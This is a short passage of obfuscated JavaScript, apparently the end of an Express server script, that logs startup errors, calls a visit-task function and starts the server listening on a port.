AddVisitTask();}catch(_0x536211){console[_0x35fe7e(0x187)]('Error\x20in\x20startserver:',_0x536211);}}startserver()['catch'](_0x4f7a50=>{const _0x26a8dd=_0x5caeb7;console[_0x26a8dd(0x187)]('Unhandled\x20error\x20in\x20startserver:',_0x4f7a50);}),app[_0x5caeb7(0xfd)](PORT,()=>console[_0x5caeb7(0xe0)](_0x5caeb7(0xfc)+PORT+'!'));
